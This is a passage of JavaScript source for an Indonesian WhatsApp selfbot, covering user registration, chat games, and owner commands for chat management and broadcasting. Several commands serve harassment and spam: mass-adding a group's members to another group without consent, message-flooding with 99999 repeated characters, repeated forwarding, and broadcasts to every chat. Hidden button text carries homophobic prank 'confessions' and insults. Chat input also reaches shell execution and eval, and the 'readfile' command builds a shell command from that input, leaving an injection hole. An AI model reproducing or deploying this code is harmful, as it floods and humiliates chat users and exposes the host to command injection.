            imageMsg = (await pemuda.prepareMessageMedia(fs.readFileSync(`./media/image/fotogw.jpg`), 'imageMessage', {})).imageMessage
            buttonsMessage = {
            contentText: `${rulss}`,
            footerText: `Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎`, imageMessage: imageMsg,
            buttons: buttons,
            headerType: 4
}
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
            pemuda.relayWAMessage(prep)     
            break                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               

//<-------------------------< Register Om >---------------------->
     case 'register':
     case 'daftar':
     case 'verify':
     case 'regis':
 
            
            if (!isOwner && !mek.key.fromMe) return                 
            
            if (isRegistered) return freply(mess.only.uregis)
            veri = sender
            parseMention = (text = '') => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}
            const serialUser = createSerial(20) 
            register.push(sender)
            fs.writeFileSync('./database/register.json', JSON.stringify(register))
            teks = `*「 𝗣𝗘𝗡𝗗𝗔𝗙𝗧𝗔𝗥𝗔𝗡 𝗨𝗦𝗘𝗥 」*\n\n🌹 *Nama :* ${pushname}\n🌹 *Nomor :* wa.me/${sender.split("@")[0]}\n🌹 *Waktu Verify :* ${time}\n🌹 *SN :* ${serialUser}\n🌹 *User Verified :* ${_registered.length} User\n\n*Terimakasih Sudah Mendaftarkan Diri Dalam Database Bot WhatsApp*`
            addRegisteredUser(sender, pushname, time, serialUser)
            buttons = [{buttonId: `${prefix}menu`, buttonText: {displayText: '🏷MENU️️'}, type: 1}]
            imageMsg = (await pemuda.prepareMessageMedia(gambaruser, 'imageMessage', {thumbnail: gambaruser})).imageMessage
            buttonsMessage = {
            contentText: `${teks}`,
            footerText: `Ⓒ ︎𝐶𝑟𝑒𝑎𝑡𝑜𝑟 𝐵𝑜𝑡 𝑀𝑎𝑟𝑐𝑒𝑙︎`, 
            imageMessage: imageMsg,
            buttons: buttons,
            headerType: 4}  
            prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, sendEphemeral: true, contextInfo:{"forwardingScore":999,"isForwarded":true, "mentionedJid": [tagme + '@s.whatsapp.net', sender]}})
            pemuda.relayWAMessage(prep)
            console.log(color('[ REGISTER ]'), color(time, 'yellow'), 'Serial:', color(serialUser, 'cyan'), 'in', color(sender || groupName))
            
            break           
                                                                                   
//------------------< Game >------------------- 
    case 'gelud':
            //if (!isRegister) return freply(mess.only.regis)    
            if (isGame(sender, gcount, glimit)) return freply(`Limit game kamu sudah habis`)
            if (!isGroup) return freply(mess.only.group)
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return freply('Hanya bisa dengan 1 orang')
            if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
            if (args.length === 0) return freply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
            if (fs.existsSync(`./media/${from}.json`)) return freply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)					
            gelutSkuy = setGelud(`${from}`)
            gelutSkuy.status = false
            gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
            gelutSkuy.Y = args[0].replace("@", "");
            fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
            starGame = `👑 Memulai Game Baku Hantam 👊🏻

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud
[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan`

            pemuda.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
            gameAdd(sender, glimit)
            break
    case 'delsesigelud':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (fs.existsSync('./media/' + from + '.json')) {
            fs.unlinkSync('./media/' + from + '.json')
            freply('Berhasil Menghapus Sesi Gelud')
            } else {
            freply('Tidak ada sesi yang berlangsung')
}
            break
    case 'delsesittt':
    case 'resetgame':
            //if (!isRegister) return freply(mess.only.regis)    
            if (!isGroup) return freply(mess.only.group)
            if (!isTTT) return freply('Tidak Ada Permainan Di Grub Ini')
            naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
            ky_ttt = naa 
            freply('Sukses Mereset Game')
            break
    case 'tictactoe':
    case 'ttc':
            //if (!isRegister) return freply(mess.only.regis)    
            if (isGame(sender, gcount, glimit)) return freply(`Limit game kamu sudah habis`)
            if (!isGroup) return freply(mess.only.group)
            if (args.length < 1) return freply('Tag Lawan Anda! ')
            if (isTTT) return freply('Sedang Ada Permainan Di Grub Ini, Harap Tunggu')
            if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return freply('Tag target Lawan!')
            ment = mek.message.extendedTextMessage.contextInfo.mentionedJid
            player1 = sender
            player2 = ment[0]
            angka = ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
            id = from
            gilir = player2
            ky_ttt.push({player1,player2,id,angka,gilir})
            pemuda.sendMessage(from, 
`*🎳 Memulai Game Tictactoe 🎲*

[@${player2.split('@')[0]}] Menantang anda untuk menjadi lawan Game🔥
Ketik Y/N untuk menerima atau menolak permainan

Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contextInfo: {mentionedJid: [player2]}})
            gameAdd(sender, glimit)
            break
   case 'slot':
            //if (!isRegister) return freply(mess.only.regis)   
            const sotoy = ['🍊 : 🍒 : 🍐','🍒 : ?? : 🍊','?? : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
            somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
            somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
            somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
            if (somtoyy  == '🍌 : 🍌 : 🍌') {
            reply(`*🎰 GAME SLOT 🎰*\n\n⌬━━━━━━━━━━━⌬\n${somtoy}\n${somtoyy} *⌬━━━━⌬*\n${somtoyyy}\n⌬━━━━━━━━━━━⌬\n\n*SELAMAT KAMU MENANG🎉*`)
            } else if (somtoyy == '?? : 🍒 : 🍒') {
            reply(`*🎰 GAME SLOT 🎰*\n\n⌬━━━━━━━━━━━⌬\n${somtoy}\n${somtoyy} *⌬━━━━⌬*\n${somtoyyy}\n⌬━━━━━━━━━━━⌬\n\n*SELAMAT KAMU MENANG🎉*`)
            } else if (somtoyy == '🔔 : 🔔 : 🔔') {
            reply(`*🎰 GAME SLOT 🎰*\n\n⌬━━━━━━━━━━━⌬\n${somtoy}\n${somtoyy} *⌬━━━━⌬*\n${somtoyyy}\n⌬━━━━━━━━━━━⌬\n\n*SELAMAT KAMU MENANG🎉*`)
            } else if (somtoyy == '?? : 🍐 : 🍐') {
            reply(`*🎰 GAME SLOT 🎰*\n\n⌬━━━━━━━━━━━⌬\n${somtoy}\n${somtoyy} *⌬━━━━⌬*\n${somtoyyy}\n⌬━━━━━━━━━━━⌬\n\n*SELAMAT KAMU MENANG🎉*`)
            } else if (somtoyy == '🍇 : 🍇 : 🍇') {
            reply(`*🎰 GAME SLOT 🎰*\n\n⌬━━━━━━━━━━━⌬\n${somtoy}\n${somtoyy} *⌬━━━━⌬*\n${somtoyyy}\n⌬━━━━━━━━━━━⌬\n\n*SELAMAT KAMU MEMANG🎉*`)
            } else {
            reply(`*🎰 GAME SLOT 🎰*\n\n⌬━━━━━━━━━━━⌬\n${somtoy}\n${somtoyy} *⌬━━━━⌬*\n${somtoyyy}\n⌬━━━━━━━━━━━⌬\n\n*SELAMAT KAMU KALAH🐤*`)
}
            break                                                                                                                                                                                                                                    
   case 'suit': 
            //if (!isRegister) return freply(mess.only.regis)   
            if (!q) return freply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
            const userspilih = q
            if (!userspilih.match(/batu|gunting|kertas/)) return freply(`Pilih batu, kertas, gunting`)
            var computer = Math.random();
            if (computer < 0.34 ) {
            computer = 'batu';
            } else if( computer >= 0.34 && computer < 0.67) {
            computer = 'gunting';
            } else {
            computer = 'kertas';
}
            if ( userspilih == computer ) {
            freply(`Pertandingan Seri!`)
            } else if ( userspilih == 'batu' ) {
            if( computer == 'gunting' ) {
            freply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
            } else {
            freply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
            } else if ( userspilih == 'gunting' ) {
            if( computer == 'batu' ) {
            freply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
            } else {
            freply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
            } else if ( userspilih == 'kertas' ) {
            if( computer == 'batu' ) {
            freply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
            } else {
            freply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
            break 
               
//<------------------< Owner >---------------->
      case 'leaveall':
           if (!isOwner) return freply(mess.only.owner)           
           for (let id of totalgroup) {
           sendMess(id, 'Bye²🐣', null)
           await sleep(3000)
           pemuda.groupLeave(id)
}
           break
    case 'leave':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           if (!isGroup) return reply(mess.only.group)
           setTimeout( () => {
           pemuda.groupLeave(from) 
           }, 2000)
           setTimeout( () => {
           freply('Bye²🐣')
           }, 0)
           break  
       case 'kickall': // Anti Banned
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           if (!isGroup) return reply(mess.only.group)
       
           for (let i of groupMembers) {
           await kickMember(from, [i.jid])
}
           break 
     case 'sendfile':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           if (!q) return freply(`Example : ${prefix+command} ./lib/simple.js|simple.js`)
           namaf = q.split('|')[0]
           fnama = q.split('|')[1]
           anud = fs.readFileSync(namaf)
           pemuda.sendMessage(from, anud, document, {mimetype:'jpg/application', filename:`${fnama}`})
           break                                 
     case 'savefile':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           if(!m.quoted) return freply('Reply Teksnya')
           if(!q) return freply(`Nama Filenya Apa Kak?`)
           freply(mess.wait)
           mengsev = await m.quoted.text
           fs.writeFileSync(`./${q}`, mengsev)
           freply(`Sukses Save File Dengan Nama ${q}`)
           break
     case 'downloadfile':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           if(!m.quoted) return freply('Reply File Yang Ingin Di Download!')
           if (!q) return freply(`Nama Filenya Apa Kak?`)
           freply(mess.wait)
           saveas = await m.quoted.download()
           fs.writeFileSync(`./${q}`, saveas)
           freply(`Sukses Download File Dengan Nama ${q}`)
           break
     case 'readfile':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           if(!m.quoted) return freply('_Reply File Yang Ingin Di Lihat!_')
           if (!q) return freply(`Masukan Format File!`)
           freply(mess.wait)
           saveas = await m.quoted.download()
           fs.writeFileSync(`./lib/.${q}`, saveas)
           cmyd2 = `cat lib.${q}`
           var itsme2 = `0@s.whatsapp.net`
           var split2 = `${fake}`
           term2 = {
           contextInfo: {
           participant: itsme2,
           quotedMessage: {
           extendedTextMessage: {
           text: split2,}}}}
           exec(cmyd2, (err, stdout) => {
           if (err) return pemuda.sendMessage(from, ` ${err}`, text, { quoted:mek })
           if (stdout) {
           pemuda.sendMessage(from, stdout, text, term2)}})
           break            
     case 'unpin':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           pemuda.modifyChat(from, ChatModification.unpin)
           freply('_*Successfully Unpin Chats🌹*_')
           console.log('Unpin Chat' + from)
           break                
     case 'pin':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           pemuda.modifyChat(from, ChatModification.pin)
           freply('_*Successfully Pin Chats🌹*_')
           console.log('Pin Chat ' + from)
           break                
     case 'archive':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           freply('_*Successfully Archive Chats🌹*_')
           console.log('succes archive chat = ' + from)
           await sleep(3000)
           pemuda.modifyChat(from, ChatModification.archive)
           break                
     case 'unreadall':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           var chats = await pemuda.chats.all()
           chats.map( async ({ jid }) => {
           await pemuda.chatRead(jid, 'unread')})
		   var teks = `_*Successfully Unread ${chats.length} Chats🌹*_`
		   await pemuda.sendMessage(from, teks, text, {quoted: mek})
		   console.log(chats.length)
	       break	
     case 'readall':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           var chats = await pemuda.chats.all()
           chats.map( async ({ jid }) => {
           await pemuda.chatRead(jid)})
		   var teks = `_*Successfully Read ${chats.length} Chats🌹*_`
	       await pemuda.sendMessage(from, teks, text, {quoted: mek})
           console.log(chats.length)
		   break		
    case 'unarchiveall':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           freply('_*Sukses Unarchive Allchat🌹*_')
           console.log('succes unarchive chat = ' + from)
           anu = await pemuda.chats.all()
           for (let _ of anu) {
           pemuda.modifyChat(_.jid, ChatModification.unarchive)}
           break

	case 'return':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
		   return pemuda.sendMessage(from, JSON.stringify(eval(body.slice(8))), text, {quoted: mek})
		   if (err) return pemuda.sendMessage(from, `Root @CHANDRA:~ ${err}`, text, { quoted: mek })
           break                                                                                    
    case 'exif':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)      
           if (!q) return reply(mess.wrongFormat)
           if (!arg.split('|')) return freply(`Penggunaan ${prefix}exif nama|author`)
           exif.create(arg.split('|')[0], arg.split('|')[1])
           freply('Sukses!!')
           break		
    case 'join': 
           if (!q) return freply('Linknya?')
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
           link = args[0].replace('https://chat.whatsapp.com/','')
           fak = pemuda.query({ json: ['action', 'invite', link],
           expect200: true })
           freply('Berhasil Masuk Grup')
           break
    case 'runtime': 
           //if (!isRegister) return freply(mess.only.regis)    
           teks = `${kyun(run)}`
           freply(teks)
           break

	case 'speed':
	case 'ping':
           //if (!isRegister) return freply(mess.only.regis)				
		   exec(`neofetch --stdout`, (error, stdout, stderr) => {
		   const child = stdout.toString('utf-8')
		   const teks = child.replace(/Memory:/, "Ram:")
		   const pingnya = `${teks}Speed : ${latensi.toFixed(4)} Secconds`
		   freply(pingnya)
	   	   })
	   	   break 
    case 'tes':
case 'cek':
 case 'bot':
 if (!isGroup) return reply('Oke kak, Bot Sedang Online nih 👋🏻')
 runtime = process.uptime()
 const buttons = [
  {buttonId: `!000`, buttonText: {displayText: 'Oke‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n\nJadi gini, Aku mau jujur ke Kalian Semua, Kalau aku itu Gay dan Anak Haram, Aku sedang mencari Pria Gay untuk jadi pasanganku di Jerman, Kalau kalian mau atau ada kenalan Gay, Pc aja yah, Masih Anget kok  ( ◜‿◝ )♡'}, type: 1},
  ]
const buttonMessage = {
  headerType: "IMAGE",
  contentText: `Hai ${pushname}\n\n⏲️ Bot Telah Aktif Dalam Waktu :\n*${kyun(run)}*`,
  footerText: `Klik Oke untuk melanjutkan\n© Project Pemuda`,
  buttons: buttons,
  headerType: 1
  }  
 var group = await pemuda.groupMetadata(from)
 var member = group['participants']
 var mem = []
 member.map(async adm => {
 mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 var options = {contextInfo: { mentionedJid: mem },quoted: fvid}
  pemuda.sendMessage(from, buttonMessage, MessageType.buttonsMessage, options)
  break
    case 'sc':
    case 'scrip':
    case 'script':
    case 'sourcecode':	
           ohu = `*`
		   source = `${ohu}Sourcecode Dari Sini🐧${ohu}\nhttps://github.com/CHANDRA/Self-Bot`
           sendButMessage(from, `${source}`, `Powered By Project Pemuda`, [{buttonId: `${prefix}menu`,buttonText: {displayText: `MENU`},type: 1}])     
	       break

    case 'culik':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (args.length < 1) return freply('Masukin id grupnya')
           let pantek = []
           for (let i of groupMembers) {
           pantek.push(i.jid)
           }
           pemuda.groupAdd(args[0], pantek)
           break                      
    case 'repeat':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
    
           var cuok = `${args.join(' ')}`
           var Emoji = cuok.split("|")[0];
           let Karina = `${Emoji}`.repeat(99999)
           pemuda.sendMessage(from, Karina, MessageType.text, { quoted: mek})
           break	              
    case 'jadibot':
           //if (!isRegister) return freply(mess.only.regis)    
           if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)
           jadibot(reply,pemuda,from)
           break
    case 'stopjadibot':
           //if (!isRegister) return freply(mess.only.regis)    
           if (!isPremium && !isOwner && !mek.key.fromMe) return freply(mess.only.prem)
           stopjadibot(reply)
           break
    case 'listbot':
    case 'listjadibot':
           //if (!isRegister) return freply(mess.only.regis)    
           let jamdibot = '*──「 LIST JADIBOT 」──*\\n\n'
           for(let i of listjadibot) {
           jamdibot += `*༺ Nomor* : ${i.jid.split('@')[0]}
* Nama* : ${i.name}
*༺ Device* : ${i.phone.device_manufacturer}
*༺ Model* : ${i.phone.device_model}\n\n`
}
           freply(jamdibot)
           break            
     case 'ytku':
		pemuda.sendMessage(from, { text: "Hai kak Nih Youtube Pemilik Bot, Jangan Lupa Subcribe yak😉\n\nhttps://youtube.com/CHANDRACHANNEL", matchedText: 'https://youtube.com/CHANDRACHANNEL', description: "", title: "KLIK UNTUK SUBCRIBE", jpegThumbnail: logoyt}, 'extendedTextMessage', { detectLinks: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: fkontak})
		break
     case 'igku':
		pemuda.sendMessage(from, { text: "Hai kak Nih Youtube Pemilik Bot, Jangan Lupa Follow yak😉\n\nhttps://instagram.com/chandrahafi_", matchedText: 'https://instagram.com/chandrahafi_', description: "", title: "KLIK UNTUK FOLLOW", jpegThumbnail: logoig}, 'extendedTextMessage', { detectLinks: true, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: fkontak})
		break
     case 'owner':
     case 'creator':             
           sendKontak(from, `${owner}`, `${ownerName}`, 'Project Pemuda')
           await sleep(1000)
           haibg =`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?\n`
           buttons = [
             {buttonId: `${prefix}ytku`,buttonText:{displayText: 'YOUTUBE'},type:1},
            {buttonId:`${prefix}igku`,buttonText:{displayText:'INSTAGRAM'},type:1},
            {buttonId: `!000`,buttonText:{displayText: '‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\nGAK USAH KEPO ASU CUKUP TAU IG SAMA YT UDAH, MENCET MENCET BUTTON BUKAN JUGA KAU FOLOW 🐶'},type:1},]
           buttonsMessage = { contentText: `${haibg}`, footerText: `Runtime ${runtimenya}\nPowered By Project Pemuda`, buttons: buttons, headerType: 1 }
           prep = await pemuda.prepareMessageFromContent(from,{buttonsMessage},{})
           pemuda.relayWAMessage(prep)
           break                                                                                                           
	case 'setreply':
	case 'setfake':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
		   if (!q) return freply(mess.wrongFormat)
		   fake = q
		   freply(`Succes Mengganti Conversation Fake : ${q}`)
		   break
	case 'setfakeimg':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
           boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	  	   delb = await pemuda.downloadMediaMessage(boij)
	       fs.writeFileSync(potofake, delb)
	   	   freply('Sukses')
           } else {
           freply(`Kirim gambar dengan caption ${prefix}sethumb`)
           }
		   break	
	case 'setthumb':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
	       if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
           boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	  	   delb = await pemuda.downloadMediaMessage(boij)
		   fs.writeFileSync(Mthumb, delb)
		   freply('Sukses')
           } else {
           freply(`Kirim gambar dengan caption ${prefix}sethumb`)
           }
 		   break
    case 'setprefix':
           if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
           if (args.length < 1) return freply(`Masukkan prefix\nOptions :\n=> multi\n=> nopref`)
           if (q === 'multi'){
           multi = true
           freply(`Berhasil Mengubah Prefix Ke ${q}`)
           } else if (q === 'nopref'){
           multi = false
           nopref = true
           freply(`Berhasil Mengubah Prefix Ke ${q}`)
           } else {
           multi = false
           nopref = false
           prefa = `${q}`
           freply(`Berhasil Mengubah Prefix Ke ${q}`)}
           break 		   
     case 'mode':    
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)     
           buttonnss = [{buttonId: `public`, buttonText: {displayText: 'PUBLIC-MODE'}, type: 1},{buttonId: `self`, buttonText: {displayText: 'SELF-MODE'}, type: 1}]
           const buMess = {
           contentText: "*Pilih Mode Apa Kak✨*",
           footerText: 'Silahkan Pilih Salah Satu☕',
           buttons: buttonnss,
           headerType: 1
}
           await pemuda.sendMessage(from, buMess, MessageType.buttonsMessage, {quoted: fgif})
           break 		    		   
    case 'public':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           if (banChats === false) return
           banChats = false
           freply(`*⊷️「 PUBLIC-MODE 」*`)
           break
	case 'self':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           if (banChats === true) return
           uptime = process.uptime()
           banChats = true
           freply(`*⊷️「 SELF-MODE 」*`)
           break
    case 'deletepc':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           anu = await pemuda.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
           for (let _ of anu) {
           pemuda.modifyChat(_.jid, 'delete', {
           includeStarred: false
           })
           }
           await freply(`Berhasil menghapus ${anu.length} pribadi chat`)
           break
    case 'delchat':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           reply('Sukses Menghapus Chat' + from)
           await sleep(4000)
           pemuda.modifyChat(from, ChatModification.delete)
           break
	case 'clearall':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
		   anu = await pemuda.chats.all()
		   pemuda.setMaxListeners(10)
		   for (let _ of anu) {
		   pemuda.modifyChat(_.jid, 'delete')
}
		   reply('_*Sukses Membersihkan Semua Pesan🌹*_')
		   break                      
    case 'on':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           offline = false
           freply(`*⊷️「 KAMU TELAH ONLINE 」*`)
           break
    case 'off':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           offline = true
           waktu = Date.now()
           anuu = args.join(' ') ? args.join(' ') : '-'
           alasan = anuu
           freply(`*⊷️「 KAMU TELAH OFFLINE 」*`)
           break                                                                                       
    case 'bc':
    case 'broadcast':
    
           
           if (!isOwner && !mek.key.fromMe) return     
           
           if (args.length < 1) return freply('teks?')
           anu100 = await pemuda.chats.all()
           if (isMedia && !pemuda.message.videoMessage || isQuotedImage) {
           const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
           bc100 = await pemuda.downloadMediaMessage(encmedia)
           for (let _ of anu100) {
           pemuda.sendMessage(_.jid, bc100, image, {quoted: freply, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
           freply('Suksess broadcast')
           } else {
           for (let _ of anu100) {
           pemuda.sendMessage(_.jid, 
	   	   {"contentText": `${body.slice(4)}`,
		   "footerText": `Runtime ${runtimenya}\nPower By ᴹᴿ᭄Chandra⁴̅⁰͍⁴̵〆🌹`,
		   "buttons": [
	  	   {"buttonId": `#owner`,
		   "buttonText": {"displayText": "𝗢𝗪𝗡𝗘𝗥"
		   },"type": "RESPONSE"}			
		   ], "headerType": 'LOCATION',
		   locationMessage: { degreesLatitude: '',
	   	   degreesLongitude: '',
	 	   jpegThumbnail: potogw,
		   }}, MessageType.buttonsMessage )}
           freply('Suksess broadcast')}
           break 
	case 'tobc':
           if (!isOwner && !mek.key.fromMe) return                

		   pemuda.updatePresence(from, Presence.composing)
		   anu = await pemuda.chats.all()
		   if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
		   const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		   buff = await pemuda.downloadMediaMessage(encmedia)
		   for (let _ of anu) {
		   pemuda.sendMessage(_.jid, buff, audio, { quoted: ftroli })}
		   } else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
		   const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
		   buff = await pemuda.downloadMediaMessage(encmedia)
		   for (let _ of anu) {
		   pemuda.sendMessage(_.jid, buff, sticker, { quoted: ftroli, contextInfo: { forwardingScore: 508, isForwarded: true}})}
		   } else{
           reply('reply sticker/audio')}
	       break                                                                    
    case 'spam':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (!m.quoted) return reply(`reply pesanya`)
           if (args.length < 1) return reply(`Example :\n${prefix}spam 15`)
           if (args[0] > 150) return reply(`Maximal 150`)
           let jml = args[0]
           for(let i=0;i<jml;i++){
           m.copyNForward(m.chat, true)
}
           break
	  case 'restart':
           if (!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           reply(`_*Restarting*_`)
           exec(`cd && node main`)
           console.log('Restart...')
           sleep(4000)
           reply('_*Sukses Bang☕*_')
           break           
    case 'hacked':
           anjay = await pemuda.prepareMessageFromContent(from, pemuda.preapareDisappearingMessageSettintContent(604800), {})
           pemuda.relayWAMessage(anjay, { waitForAck: true })
           setTimeout(() => {
           pemuda.sendMessage(from, 'yahahaha', text, {quoted: anjay})
           }, 1000)
           break                      
    case 'shutdown': 
    case 'modar':	
    case 'mati':		            
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           freply(`Bye...`)
           await sleep(3000)
           process.exit()
           break           
    case 'bugreport':
    case 'report':    
           if (args.length < 1) return freply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
           teks = args.join(' ')
           freply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
           pemuda.sendMessage('6283803320107@s.whatsapp.net',`_*Bug Report🍂*_\n${teks}`, text)
           break
    case 'readall':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)    
           totalchat.map( async ({ jid }) => {
           await pemuda.chatRead(jid)
})
           freply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
           console.log(totalchat.length)
           break	                      
    case 'addupdate':
           if(!isOwner && !mek.key.fromMe) return freply(mess.only.owner)
           if (!q) return freply(`Example: ${command} update fitur`)
           _update.push(q)
           fs.writeFileSync('./database/update.json', JSON.stringify(_update))
           freply(`Update fitur berhasil ditambahkan ke database!`)
           break
    case 'update':
           //if (!isRegister) return freply(mess.only.regis)    
           let updateList = `*── 「 UPDATE BOT 」 ──*\n\n\n`
           for (let i of _update) {
           updateList += `࿃ *${i.replace(_update)}*\n\n`
           }
           freply(updateList)
           break
	case 'term':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
		   if (!q) return freply(mess.wrongFormat)
		   exec(q, (err, stdout) => {
		   if (err) return freply(`SELF-BOT:~ ${err}`)
	   	   if (stdout) {
		   freply(stdout)
	  	   }
		   })
		   break 		       		       		       		       
   case 'creategroup':
   case 'creategrup':
            
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)
           if (!isGroup) return reply(mess.only.group)
 		   if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
		   argz = arg.split('|')
		   if (mek.message.extendedTextMessage != undefined){
           mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
           for (let i = 0; i < mentioned.length; i++){
		   anu = []
		   anu.push(mentioned[i])
           }
		   pemuda.groupCreate(argz[0], anu)
	   	   freply(`Sukses membuat grup ${argz[0]}`)
           }
	       break
	       
   case 'lacakip':
           if (!mek.key.fromMe && !isOwner) return freply(mess.only.owner)   
	   	   if (args.length === 0) return freply(`Contoh :\n${prefix}lacakip 10.43.180.140`)
